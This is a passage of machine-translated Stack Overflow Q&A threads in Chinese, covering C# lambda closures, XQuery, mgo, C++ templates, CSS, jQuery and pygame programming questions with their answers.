这两个字符串完全相同，SplFixedArray 只是存储方式略有不同，因为它是一个 FIXED 数组。[简单的演示](http://sandbox.onlinephpfunctions.com/code/da43711f576a687f555fde0b7a6e28d5b7b8c4f6)

还请务必阅读手册。如果你启动 SplFixedArray（它是一个类，而不是一个函数），你会得到一个对象作为回报。手册： http: [//php.net/manual/en/class.splfixedarray.php](http://php.net/manual/en/class.splfixedarray.php)

# c# - 为什么 C# 编译器生成单个类来捕获多个 lambda 的变量？

> ID：12009309
> 
> 赞同：40
> 
> 时间：2012-08-17T16:09:28.293
> 
> 标签：c#

假设我们有这样的代码：

```
public class Observer
{
    public event EventHandler X = delegate { };
}

public class Receiver
{
    public void Method(object o) {}
}

public class Program
{
    public static void DoSomething(object a, object b, Observer observer, Receiver r)
    {
        var rCopy = r;
        EventHandler action1 = (s, e) => rCopy.Method(a);
        EventHandler action2 = (s, e) => r.Method(b);
        observer.X += action1;
        observer.X += action2;
    }

    public static void Main(string[] args)
    {
        var observer = new Observer();
        var receiver = new Receiver();
        DoSomething(new object(), new object(), observer, receiver);
    }
} 
```

这里`action1`并`action2`有完全分离的一组捕获变量 -`rCopy`是专门为此创建的。尽管如此，编译器只生成一个类来捕获所有内容（检查生成的 IL）。我想这样做是出于优化的原因，但它允许非常难以发现的内存泄漏错误：如果`a`并`b`在单个类中捕获，则至少只要引用了*任何*lambda，GC 就无法收集两者。

有没有办法说服编译器生成两个不同的捕获类？或者有什么理由不能完成？

PS 更详细一点，在我的博客中：[这里](http://sparethought.wordpress.com/2012/08/17/implicit-closures-in-c-lambdas/)和[这里](http://sparethought.wordpress.com/2012/08/17/implicit-closures-in-c-lambdas-part-2/)。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-08-17T18:01:51.430

您重新发现了在 C# 中实现匿名函数的一个已知缺点。[我在 2007 年的博客中描述了这个问题。](http://blogs.msdn.com/b/ericlippert/archive/2007/06/06/fyi-c-and-vb-closures-are-per-scope.aspx)

> 有没有办法说服编译器生成两个不同的捕获类？

不。

> 或者有什么理由不能完成？

没有*理论上*的理由为什么不能设计一种改进的算法来划分封闭变量，以便将它们提升到不同的封闭类中。出于实际原因，我们没有这样做：算法很复杂，正确和测试成本很高，而且我们一直有更高的优先级。希望罗斯林的情况会有所改变，但我们不做任何保证。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2012-08-17T16:50:19.687

我相当确定您在编译器的代码重写逻辑中看到了实际限制，这并不容易。解决方法很简单，在单独的方法中创建 lambda，以便获得隐藏类的两个单独实例：

```
public static void DoSomething(object a, object b, Observer observer, Receiver r) {
    var rCopy = r;
    observer.X += register(r, a);
    observer.X += register(rCopy, b);
}
private static EventHandler register(Receiver r, object obj) {
    return new EventHandler((s, e) => r.Method(obj));
} 
```

# xml - 使用 saxon xquery 从 xml 中删除元素

> ID：12009311
> 
> 赞同：2
> 
> 时间：2012-08-17T16:09:35.983
> 
> 标签：xml, xquery, saxon

嗨，我有一个这样的 xml：

```
<ns1:books><ns2:book category="WEB"><ns3:title lang="en">Learning XML</ns3:title>
<ns3:author>Erik T. Ray</ns3:author><ns3:year>2003</ns3:year><ns3:price>39.95</price> 
```

使用 Saxon xquery 我想删除 ns3:author 元素，谁能告诉我该怎么做？

我知道有一个 fn:remove(..) 方法，但我不想使用它，因为它需要一个整数作为第二个参数

任何完整的代码将不胜感激

同样对于撒克逊人，我也面临着类似的错误

原因：net.sf.saxon.trans.StaticError：#...nt-node() external 中的 XQuery 语法错误；复制 $temp#：超出查询结尾的意外令牌“$”

我使用了xml

声明命名空间soapenv="http://www.w3.org/2003/05/soap-envelope"; 声明命名空间 reg="http://www.mycompany.com/internal/xsd/registrationservice"; 声明命名空间 reg1="http://www.mycompany.com/internal/xsd/registrationtypes";

```
declare variable $RegistrationServiceRequest := <reg:RegistrationServiceRequest><reg1:RegistrationAttributes>       <reg1:Username>fdf</reg1:Username><reg1:Password>passwdfdford1</reg1:Password>      <reg1:Title>Mdfdfr</reg1:Title><reg1:FirstName>fdsfdsfsd</reg1:FirstName>
            </reg1:RegistrationAttributes><reg1:AutoLogin> <reg1:AutoLogin1>trtrtrt</reg1:AutoLogin1></reg1:AutoLogin>
        </reg:RegistrationServiceRequest>;
        copy $temp := $RegistrationServiceRequest 
modify delete node $temp/reg1:AutoLogin
return $temp 
```

但是当我尝试使用 zorba 时，它工作正常，唯一的问题是撒克逊语，错误出现在复制行

知道如何解决这个问题吗？

谢谢小号

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T22:06:42.220

如果您想对文档做一些小的改动，XQuery 不是您的最佳选择。您可以使用 XQuery update 来完成，也可以使用 XSLT 来完成。单独使用 XQuery 是可能的，但非常麻烦。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T18:39:37.887

您可以使用[XQuery Update](https://www.w3.org/TR/xquery-update-10/)来执行此操作：

```
copy $n := $data modify delete node $n/ns2:book/ns3:author return $n 
```

[您可以在http://www.zorba-xquery.com/html/demo#JTJCK3mGQJgLav/2uOtgldoTYoM=](http://www.zorba-xquery.com/html/demo#JTJCK3mGQJgLav/2uOtgldoTYoM=)现场试用此示例

或者使用 XQuery Scripting 删除元素：

```
delete node $data/ns2:book/ns3:author; 
$data 
```

[您可以在http://www.zorba-xquery.com/html/demo#QEuf9N5OLfD87WarBscHKrRrwm0=](http://www.zorba-xquery.com/html/demo#QEuf9N5OLfD87WarBscHKrRrwm0=)现场试用此示例

# mongodb - 为什么 mgo 不返回插入文档的 ID？

> ID：12009312
> 
> 赞同：28
> 
> 时间：2012-08-17T16:09:36.687
> 
> 标签：mongodb, go, mgo

根据文档（[http://godoc.org/launchpad.net/mgo/v2](http://godoc.org/launchpad.net/mgo/v2)），如果您使用 Upsert 方法，您可以获得“Upserted”文档的 ID。

还有一个不提供此功能的 Insert 方法。
这是为什么？如果我想执行插入而不是 Upsert 怎么办？（或者永远不会有任何正当理由想要这样做？我开始怀疑了。）

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-08-17T19:35:03.837

你用[`bson`](http://go.pkgdoc.org/launchpad.net/mgo/v2/bson). [`NewObjectId()`](http://go.pkgdoc.org/launchpad.net/mgo/v2/bson#NewObjectId)生成要插入的 ID。

这是您插入新文档的方式：

```
i := bson.NewObjectId()
c.Insert(bson.M{"_id": i, "foo": "bar"}) 
```

由于您在发出 时不知道是要插入还是更新`Upsert`，所以生成一个 ID 只是为了在查询后立即删除它是多余的（以防发生更新）。这就是它在数据库端生成并在适用时返回给您的原因。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-08-27T16:54:15.280

这根本不应该发生，mgo 应该插入并返回 Id，因为，如果我们从应用程序本身生成 ObjectId，如果应用程序重新启动，Object Id 生成器将从头开始，一次又一次地生成相同的 ID ，从而更新数据库中的现有记录。

这是错误的，MGO 应该依赖数据库来生成这些 ID 并更新对象或立即返回插入对象的 objectId，就像绑定到 MongoDB 的其他语言在 Python 或 Java 中所做的那样。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-01-07T08:11:27.203

您可以随时尝试 Upsert 函数来获取生成的 ID。

```
db := service.ConnectDb()
sessionCopy := db.Copy()
defer sessionCopy.Close() // clean up

collection := sessionCopy.DB(service.MongoDB.DTB).C(MessageCol.tbl)

log.Println("before to write: ", msg)

// Update record inserts and creates an ID if wasn't set (Returns created record with new Id)
info, err := collection.Upsert(nil, msg)
if err != nil {
    log.Println("Error write message upsert collection: ", err)
    return MessageMgo{}, err
}

if info.UpsertedId != nil {
    msg.Id = info.UpsertedId.(bson.ObjectId)
}

// gets room from mongo
room, err := GetRoom(msg.Rid)
if err != nil {
    return msg, err
}

// increments the msgcount and update it
room.MsgCount = room.MsgCount + 1
err = UpdateRoom(room)
if err != nil {
    return msg, err
}

return msg, err 
```

这是我拥有的示例代码并且工作正常......

# c++ - 如何创建模板类对象数组？

> ID：12009314
> 
> 赞同：12
> 
> 时间：2012-08-17T16:09:41.047
> 
> 标签：c++, arrays, templates

我已经有一段时间没有做过任何 C++ 编程了，我决定在业余时间稍微搞砸它，所以我决定写一个小数据库程序只是为了好玩，但我在创建时遇到了麻烦一组模板化的类对象。

我所拥有的是这个类，我想用它来表示数据库记录中的一个字段。

```
template <class T, int fieldTypeId>
class Field
{
private:
    T field;
    int field_type;
public:
    // ...
}; 
```

我想使用该类的数组来表示使用该类的数据库中的记录。

```
class Database_Record
{
private:
    int id;
    Field record[];
public:
    Database_Record(int);
    Database_Record(int, Field[]);
   ~Database_Record();
}; 
```

我坚持的是在`Database_Record`类中创建数组，因为这是一个模板类对象数组，每个元素可能属于不同的类型，因此我不确定如何声明数组。我正在尝试做的事情是可能的，还是我做错了？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-17T16:20:26.243

`Field<T1>`并且`Field<T2>`是两种完全不同的类型。要在向量中处理它们，您需要在某个地方进行泛化。你可以写`AbstractField`和

```
struct AbstractField{
  virtual ~AbstractField() = 0;
};

template<class T,int fieldTypeId>
class Field: public AbstractField{
  private:
    T field;
  public:
    const static int field_type;
  public:
    virtual ~Field(){}
};

class Database_Record{
  std::vector<AbstractField*> record; 
  public:
    ~Database_Record(){
      //delete all AbstractFields in vector
    }
}; 
```

然后保持一个`vector`。`AbstractField`也使用`vector`代替`[]`. 使用`AbstractField*`代替`AbstractField`并在`AbstractField`.

您可以制作`AbstractField`纯虚拟的析构函数。并且不要忘记删除所有`AbstractField`s。在`~Database_Record()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:26:26.357

为了创建不同类型的数组，您需要对象的基类，并且该数组将是指向该基类的指针数组。所以，例如，

```
class Field
{
public:
    virtual ~Field() {}
    virtual std::string toString() const = 0;
    // and possibly other interface functions...
};

template <class T> FieldImpl : public Field
{
public:
    virtual std::string toString() const
    {
        std::stringstream ss;
        ss << val;
        return ss.str();
    }

    // implementation of possibly other interface functions        

private:
    T val;
} 
```

将是您需要的类型。然后数组将类似于

```
std::vector<std::unique_ptr<Field>> my_array; 
```

然后，您可以使用接口函数对数组进行处理，例如

```
my_array[i]->toString(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:15:35.437

你走错路了。

模板用于创建不同的类型：`std::vector<int>`并且以与以往相同的方式（和`std::vector<float>`一样多）不同。`int``float`

你的语法也是错误的；要创建一个动态数组，您可以将以下成员放入您的`Database_Record`：

```
 std::vector<Field> record; // if this was possible; however, it's not 
```

要将多个不同类型的对象放入一个数组中，它们应该有一个共同的基类。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-17T17:00:54.133

如前所述，C++ 模板不是这样工作的。

同时，由于性能限制，使用指针的继承和向量不适合数据库记录的实现。

退后一步，以更抽象的方式看待问题。正如我从您的代码中了解到的那样，其目的是将任意数量的不同类型的字段打包到一个连续的内存块中。示意图：

```
struct DBRecord {
    Type1 f1;
    Type2 f2;
    Type3 f3;
    Type4 f4;
    // etc...
} 
```

您可以通过一个包含抽象模板声明和几个特化的有点难看但实用的构造来实现这一点。

声明如下所示：

```
template <
    typename T1,
    typename T2 = void,
    typename T3 = void,
    typename T4 = void,
    typename T5 = void,
    typename T6 = void,
    typename T7 = void,
    typename T8 = void,
    typename T9 = void,
    typename T10 = void
> struct DBRecord; 
```

它显然将最大字段数限制为某个特定数字。如果您需要真正任意数量的字段，则需要切换到面向列的范例。

然后，部分特化应该为从 1 到 10 的每个数量的参数声明结构的解剖：

```
template <
    typename T1
> struct DBRecord <T1, void, void, void, void, void, void, void, void, void> 
{
    int id;
    T1 f1;
    DBRecord(int ID, T1 F1) {/*...*/};
};

template <
    typename T1,
    typename T2
> struct DBRecord <T1, T2, void, void, void, void, void, void, void, void> 
{
    int id;
    T1 f1;
    T2 f2;
    DBRecord(int ID, T1 F1, T2 F2) {/*...*/};
};

// etc... 
```

`new[]`现在，如果需要，您可以在一次调用中将表分配为特定类型的记录数组。而且，您通常不关心每个字段的破坏，因为您释放了整个结构的内存。

宏可以帮助使此类专业化的声明更加紧凑。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-17T16:16:53.857

你做错了模板。实例化具有不同类型的类模板将再次产生两种不同的类型，可能具有不同的大小，这使得无法将它们存储在数组中。

如果要统一处理不同的类型，请使用继承。并且当你使用继承时，不要使用普通数组，而是使用`vector`or `std::array`。

您的代码中还有一堆奇怪的东西：为什么 `fieldTypeId`在静态已知时存储 a ？我想这与`T`您用作模板参数的类型有关。通过部分特化将机制外部化：

```
template<typename T>
struct fieldTypeId;

template<>
struct fieldTypeId<int> {
  const static int value = 0;
}; 
// etc.... 
```

如果我完全错了并且你真的知道你在做什么：通过某种`any`类型使用类型擦除（例如[Boost.Any](http://www.boost.org/libs/any)）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-17T16:17:00.940

将具有不同模板参数的每个实例化视为不同的类。您要么需要存储一个特定的类（即`Field<int, 17>`），要么需要一个*可以*存储在列表中`Field`的非模板基类。

 ** * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-17T16:20:16.087

你可以做这样的事情 -

```
template <class T, int fieldTypeId>
class Field
{
private:
    T field;
    int field_Type;
};

template <class T, int fieldTypeId>
class Database_record
{
private:
    int id;
    std::vector<Field<T, fieldTypeId> > record_;
}; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-02-07T10:48:05.207

受 C# 的 ToString() 启发，制作了 2 个用于快速调试报告的示例类：

```
class UnknownType_t {
public:
    virtual operator long&() { throw "Unsupported"; };
    virtual operator const std::string() { throw "Unsupported"; };
    virtual void Set(char*, long) = 0;
};

class Number : public UnknownType_t {
public:
    Number(long _n) { n = _n; };
    virtual operator long&() { return n; };
    virtual void Set(char* buf, long size) {
        n = 0;
        memcpy(&n, buf, size);
    }

    long n;
};

class String : public UnknownType_t {
public:
    String(const char *_s) : s(_s) {};
    virtual operator const std::string() { return s; };
    virtual void Set(char* buf, long size) {
        s = std::string(reinterpret_cast<char*>(buf), size);
    }

    std::string s;
}; 
```

您可以尝试使用 dynamic_cast 检查类型，导致 UnknownType_t 的常见数组看起来像 {n=123 } 或 {s="ABC" }。

Base 并非纯虚拟的意图 - 所需的交叉吸气剂没有意义......*

# jquery - 页面宽度超过屏幕宽度的 100%

> ID：12009315
> 
> 赞同：1
> 
> 时间：2012-08-17T16:09:46.527
> 
> 标签：jquery, html, css, tags, width

我有一个奇怪的问题，我正在设计一个页面，完成后发现页面底部有一个水平滚动条，我查看了页面html但发现每个标签都有一个关闭标签。

我还尝试使用 jQuery 检查宽度，发现 $(window).width() = 1351px 和 $(document).width() = 1480px

关于这个问题的原因有什么建议吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T16:19:05.027

使用您的网络检查器检查并删除内部元素，直到滚动条消失。然后修复该元素的宽度（float:left 可能有效）。可能正在发生的事情是有一个元素对于页面来说太宽了。它没有破坏任何东西，它只是导致滚动条。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2020-05-29T21:58:45.027

我发现最简单的方法是

```
* {
  max-width: 100%;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-01-10T06:29:30.357

这个问题来找我了，我已经搜索了整个页面，并且有一个宽度为 10000 的 div，因为该页面显示了一个水平条，我已将其更改为 100% 并且问题已解决我想知道为什么会这样问题只出现在 chrome 和 edge 中，而不出现在 Firefox 中

如果您的问题仅出现在 chrome 中而不出现在 Firefox 中，请在下方评论。

修复后的代码是

```
<div id="ext-comp-1025" style="height: auto; width: 100%;" 
```

# jquery - 模板中的日期时间格式

> ID：12009321
> 
> 赞同：0
> 
> 时间：2012-08-17T16:10:11.567
> 
> 标签：jquery, asp.net-mvc, json, mustache, handlebars.js

我在我的应用程序中使用胡子模板。JSON 中的日期时间值如下所示： 如何将它们转换为正确的格式？

```
Created 
"/Date(1335232596000)/"

Submitted
"/Date(1335214659000)/" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:24:41.457

您需要隔离数字`subString()`并将其用作新日期的毫秒输入。

```
var a = "/Date(1335214659000)/";
var b = parseInt(a.substring(a.indexOf('(')+1,a.indexOf(')')));
var x = new Date(b);
alert(x); 
```

最好让它成为一个函数。

```
function GetDateFromJSONData (a) {
  var b = parseInt(a.substring(a.indexOf('(')+1,a.indexOf(')')));
  return new Date(b);
}
var x = GetDateFromJSONData("/Date(1335214659000)/"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-23T23:16:07.983

[在http://weblogs.asp.net/hajan/archive/2010/12/13/jquery-templates-in-asp-net-introduction.aspx](http://weblogs.asp.net/hajan/archive/2010/12/13/jquery-templates-in-asp-net-introduction.aspx)找到以下解决方案

. 希望它可以帮助别人

```
<html xmlns="www.w3.org/.../xhtml">

<head runat="server">

   <title>...</title>

   <script src="ajax.aspnetcdn.com/.../jquery-1.4.4.min.js" type="text/javascript"></script>

   <script src="ajax.aspnetcdn.com/.../jquery.tmpl.min.js" type="text/javascript"></script>

   <script type="text/javascript">

       $(document).ready(function () {

           var test =

               {

                   Id: '43000796568231937',

                   created_at: '1294003506853-0700'

               };          

           $("#myTemplate").tmpl(test).appendTo("#tblMyTable");

       });

       function FormatDate(jDate) {

           alert("jDate:" + jDate);

           var date = eval(jDate.replace(/\/Date\((\d+)\)\//gi, "new Date($1)"));

           alert(date);

           var dDate = new Date(date);

           alert(dDate);

           var year = dDate.getFullYear();

           alert(year);

           return dDate;

       }

   </script>

   <script id="myTemplate" type="text/html">

       <tr><td>${Id} - ${FormatDate(created_at)}</td></tr>

   </script>

</head>

<body>

   <form id="form1" runat="server">

       <table id="tblMyTable"></table>

   </form>

</body>

</html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-08T22:04:26.263

我知道这个问题很老，但 2014 年车把的解决方案是使用助手。例如：

```
Handlebars.registerHelper("formatDate", function (datetime) {
    var d = parseInt(datetime.match(/\d+/));
    return new Date(d);
}); 
```

然后在您的车把模板中使用它：

```
{{formatDate Created}} 
```

或者

```
{{formatDate Submitted}} 
```

希望这可以帮助

# mysql - 如何构建包含大量数据的 MYSQL 表？

> ID：12009324
> 
> 赞同：0
> 
> 时间：2012-08-17T16:10:25.390
> 
> 标签：mysql

我有我们系统中每个用户的统计数据。这些统计数据需要经常更新。

统计数据如下所示：

```
Campaign : Performance
Campaign : Performance 
```

每个活动都有自己的数据存储在 MYSQL 的另一个表中。需要经常为每个用户和每个活动更新性能指标。超过 5000 个用户需要更新 1000 多个活动。

起初我考虑简单地制作一个巨大的 VARCHAR 列，将数据存储为“campaignId-Performance,campaignId2-Performance,...”

查询数据库时，将首先按其国家/地区搜索这些活动，然后按表现最高的降序排列。COUNTRY 数据存储在活动表中。在我的新表格中，我正在考虑为每个国家/地区创建一个列，然后将广告系列按照各自的表现进行拆分。我不确定这是否会更有效率。

有了这个糟糕的描述，我希望有人可以提出最佳结构。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:48:11.597

我认为您希望将此性能存储在具有 3 列的表中：`campaignID,userID,performance`. 这将为您提供最大的灵活性来查询您可能需要的信息。可以轻松地按广告系列或用户汇总性能。通过快速加入活动表，您还可以按国家/地区进行汇总。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:23:54.383

那么，您要构建一个包含 1000 个活动和 5000 个用户的 MySQL 数据库吗？活动是否包含每个国家/地区的表现？如果是这样，我建议创建一个名为 Country 的列，然后是 Performance Column。此外，了解您尝试查看信息的内容会很有帮助。

# javascript - 为什么这个 childNodes 会给我那个奇怪的输出？

> ID：12009329
> 
> 赞同：1
> 
> 时间：2012-08-17T16:10:55.043
> 
> 标签：javascript, dom, undefined, nodes

为什么当我记录`tagName`特定节点列表中的所有节点时，它会给我这个重复的`undefined`反馈？

这是我从中提取节点的代码的一部分：

**索引.html**

```
<form name="contactForm" id="contactForm">
    <div id="textInfo">
        <ul>    
            <li>            
                <label for="firstName"  class="mainLabel">First Name : </label>
                <input type="text" name="firstName" id="firstName"/>
                <span>This must be filled</span>
            </li>    
            <li>    
                <label for="lastName"  class="mainLabel">Last Name : </label>
                <input type="text" name="lastName" id="lastName"></input>
                <span>This must be filled</span>
            </li>    
            <li>    
                <label for="email"  class="mainLabel">E-mail : </label>
                <input type="email" name="email" id="email"></input>
                <span>This must be filled</span>
            </li>                            
        </ul>
    </div>​ 
```

**脚本.js**

```
var myForm = document.forms["contactForm"];
eventUtil.add(myForm, "submit" , function(evt){
        var firstName = myForm.elements["firstName"];

        if(firstName.value == ""){      
            for(i=0; i < firstName.parentNode.childNodes.length ; i++){
                console.log("childNodes[" + i + "]: " + firstName.parentNode.childNodes[i].tagName);
            }
            eventUtil.preventDefault(evt);
        }
    }); 
```

输出是：

```
childNodes[0]: undefined
childNodes[1]: LABEL
childNodes[2]: undefined
childNodes[3]: INPUT
childNodes[4]: undefined
childNodes[5]: SPAN
childNodes[6]: undefined 
```

为什么它`undefined`反复给我那个输出？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:26:37.293

```
for(i=0; i < firstName.parentNode.childNodes.length ; i++){
    var currNode=firstName.parentNode.childNodes[i];
    if(currNode.nodeType==1){
        console.log("childNodes[" + i + "]: " + currNode.tagName);
    }                
} 
```

您可以检查 nodeType (Node.ELEMENT_NODE == 1) 以仅选择 Element。

# css - CSS /第一段上方的边距

> ID：12009332
> 
> 赞同：1
> 
> 时间：2012-08-17T16:11:19.690
> 
> 标签：css

[http://www.ratest6.com/](http://www.ratest6.com/)

在“人们在说什么”下的右侧边栏中 - “推荐”的标题（上面写着“Maggie ...”）和第一段。我想删除个人推荐的标题和第一段之间的空格（所以它看起来更像是 BR）。

我找不到或摆脱 h4 和第一段之间的空格。

我唯一看到的；1\. 通用 P 样式（底部边距 18px） 2\. 具有“用户代理”样式

`p { -webkit-margin-before: 1em; -webkit-margin-after: 1em;}`

所以我写了这个（它什么也没做）；

`div.textwidget p:first-child {margin: 0 0 18px 0; padding:0; -webkit-margin-before: 0;}`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:15:13.887

您的样式规则不会被应用，因为您`p`不是第一个孩子，而是`h4`. 你可以使用

```
div.textwidget h4 + p {
margin: 0 0 18px 0;
} 
```

`-webkit-`不需要前缀属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:21:10.910

你以前用过谷歌的检查工具吗？您可以右键单击要查看样式的元素，然后选择检查元素。这将在底部弹出一个框，向您显示文档的结构，以及每个元素的样式。

使用这个工具，我可以看到你的 h4 标签的样式是这样的：

```
h4.widget-title {
    margin:0;
    padding:0;
} 
```

我能够通过使用负边距来更改 the`<h4>`和 the之间的空间，如下所示：`<p>`

```
h4.widget-title {
    margin-bottom:-10px;
    padding:0;
} 
```

只是尝试一下，因为它可能会解决您的问题。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-17T16:15:15.573

减少边距中的 18px vlue。你会得到想要的结果。最好把它归零

```
margin:0; 
```

# jquery - 提交表单后关闭模式窗口

> ID：12009340
> 
> 赞同：1
> 
> 时间：2012-08-17T16:11:48.023
> 
> 标签：jquery, asp.net-mvc-3

我已经搜索了所有类似的问题，但不幸的是，似乎没有一个对我有用。

我在做什么：我有一个主页，上面有一个上传文档的链接。单击该链接时，它会打开一个带有简单上传表单的模式窗口：

```
<div id="uploadResults">
@using (Html.BeginForm("_uploadDocument", "Request", FormMethod.Post, new { id = "uploadDoc", enctype = "multipart/form-data" }))
 {
    <input name="eGuid" value="@ViewBag.eGuid" id="eGuid" type="hidden" />
    <input name="result" id="result" value="@ViewBag.result" type="hidden" />
    <label for="attachment">Attachment:</label><input type="file" name="attachment" id="attachment" />
    <br />
    <input type="submit" name="submit" value="Upload" class="txtButton" />
 }
</div> 
```

在提交表单时，我想在控制器中调用我的 _uploadDocument 方法。如果上传成功，则关闭模式窗口，以便再次出现父窗口。如果出现错误，则保持模式窗口存在并显示一些通知文本。

我的 httppost 控制器（抱歉，我尝试了几种方法，所以你会看到一些注释掉的位）：

```
[HttpPost]
        public void _uploadDocument(string eGuid, HttpPostedFileBase attachment)
        {
            // store result txt
            string result = "";

            // check for uploaded file
            if (attachment != null && attachment.ContentLength > 0)
            {
                // get filename
                var uploadedFileName = Path.GetFileName(attachment.FileName);
                var newFileName = eGuid + "_" + uploadedFileName;

                // store to the shared directory
                var path = System.Web.Configuration.WebConfigurationManager.AppSettings["UploadDirectory"];
                var savePath = Path.Combine(path, newFileName);
                try
                {
                    attachment.SaveAs(savePath);
                    result = "success";
                }
                catch
                {
                    result = "There was an issue uploading your file";
                }
            }
            else
            {
                result = "No file was chosen for upload";
            }

            ViewBag.result = result;
            ViewBag.eGuid = eGuid;
            //return PartialView("_uploadDocument");
            //return Json(new { result = result});
            //return Json(result);
        } 
```

在上面的表单所在的模式窗口中，我尝试了以下 jquery：

```
$("#uploadDoc").submit(function (e) {
        $.post(this.action, { eGuid: $('#eGuid').val(), attachment: $('#attachment') }, function () {
            $("#dialog5").dialog('close');
            //alert("In");
            //return false;
        });
        //$.post(this.action, { eGuid: $('#eGuid').val(), attachment: $('#attachment') });
        return false;
    }); 
```

我的结果 - 如果我序列化传递的数据，那么成功函数会触发但未上传文档（因此模式窗口关闭但未上传文档）。

如果我使用上述代码，则文件已上传，但提交后我会进入空白屏幕...

我当然会很感激任何指示！

更新这是从父页面打开模式窗口的代码：

```
// person look-up modal window
    $(function () {
        $('#dialog5').dialog({
            autoOpen: false,
            width: 400,
            resizable: false,
            title: 'Upload Document',
            dataType: "json",
            modal: true,
            open: function (event, ui) {
                var updateArea = $(this).data('area');
                //alert(updateArea);
                $(this).load('@Url.Action("_uploadDocument", "Request")' + '?eGuid=' + updateArea);
            },
            cancel: function (event, ui) {
                $(this).dialog("close");
            }
        });

        $('.attachDocument').live("click", function () {
            var field = this.name;
            $('#dialog5').data('area', field).dialog('open');
        });
    }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:18:21.693

如果不使用 html 5、iframe hack 等，您将无法通过 ajax 上传文件。在我看来，您最好的选择是使用上传器，例如[uploadify](http://www.uploadify.com/)或[plupload](http://www.plupload.com/)。

[Binding-httppostedfilebase-using-ajax-beginform](https://stackoverflow.com/questions/2491230/binding-httppostedfilebase-using-ajax-beginform)是一个类似的问题，它有一些很好的建议来解决这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:19:22.613

看起来你可能一直在正确的轨道上，但放弃了它。

您无法`return`从无效中正确发布声明。您是否考虑过将您的 uploadDocument 方法`bool`改为a`void`并返回成功状态？

这样，您可以执行以下操作：

```
$.post(this.action, { eGuid: $('#eGuid').val(), attachment: $('#attachment') }, function (data) {
  if(data == true) {
    $('#uploadResults').hide();
  }
}); 
```

# python - 如何找到最近的 pygame 碰撞检测开放位置？

> ID：12009341
> 
> 赞同：1
> 
> 时间：2012-08-17T16:11:57.210
> 
> 标签：python, collision-detection, pygame

我已经关闭了碰撞检测。现在，我需要找到移动玩家的位置，这样他就不会剪裁任何块。一旦我有了碰撞检测，我想将玩家移动到最近的空地。有没有办法轻松做到这一点？我知道我需要找到重叠的矩形，但我不知道该怎么做。如果您对这篇文章有任何信息，请！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:22:36.803

一种非常常见的方法是尝试将玩家移动到一个位置，然后查看他是否真的与任何东西发生碰撞。如果他不是，请移到那里，否则，请尝试另一个位置。在伪代码中：

```
temp_pos = player.pos + (-1, -1) #move downleft one block
if player.pos != enemy.pos: #if the position is not occupied
    player.pos = temp_pos # move the player there.
else:
    #move player to another location and try again 
```

不过，基本上，我会有一个列表来关闭播放器周围的所有空间（或可用方向），然后循环遍历它，而不是手动对所有方向进行硬编码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:57:06.333

我想要的是它的碰撞矩形。此代码中的 P3。然后，我可以找出最接近碰撞的一侧并相应地移动玩家。

```
def collide(self,p1, p2):
    p3=pygame.Rect()
    if p1.colliderect(p2):
        negpos=[0,0]
        dx=p1.x-p2.x
        dy=p1.y-p2.y
        if dx==abs(dx): negpos[0]=-1
        else: negpos[0]=1
        if dy==abs(dy): negpos[1]=-1
        else: negpos[1]=1
        if negpos==[-1,-1]:
            #topleft, bottomright
            p3tlx=p2.x
            p3tly=p2.y
            p3brx=p1.x+p1.w
            p3bry=p1.y+p1.h
        elif negpos==[-1,1]:
            # topright, bottomleft
            p3blx=p2.x
            p3bly=p2.x+p2.h
            p3trx=p1.x+p1.w
            p3try=p1.y
        elif negpos==[1,1]:
            # topleft, bottomright
            p3tlx=p1.x
            p3tly=pl.y
            p3brx=p2.x+p2.w
            p3bry=p2.y+p2.h
        elif negpos==[1,-1]:
            #topright, bottomleft
            p3trx=p2.x+p2.w
            p3try=p2.y
            p3blx=p1.x
            p3bly=p1.y-p1.h
        if p3trx:
            p3 = pygame.Rect(p3blx,p3try,abs(p3trx-p3blx),abs(p3try-p3bly))
        else:
            p3 = pygame.Rect(p3tlx,p3tly,abs(p3tlx-p3brx),abs(p3tly-p3bry)) 
```

# jquery - 从下拉列表中检索选择并填充列表

> ID：12009343
> 
> 赞同：2
> 
> 时间：2012-08-17T16:12:04.017
> 
> 标签：jquery, element, populate

我需要检索页面上每个下拉列表的所有选定值，并使用这些值填充无序列表。当然，每个项目都有一个新的 li 元素。

目前我有这个：

```
$(document).ready(function() {
    $("select").each(function() {
        var sel = "";
        $(this).find(":selected").each(function() {
            sel += $(this).text() + " ";
        });
        $(".size-result").text(sel);
    });
});​ 
```

如何使用它来创建一个新的 li 元素然后插入文本？

感谢wirey，我得到了它：

```
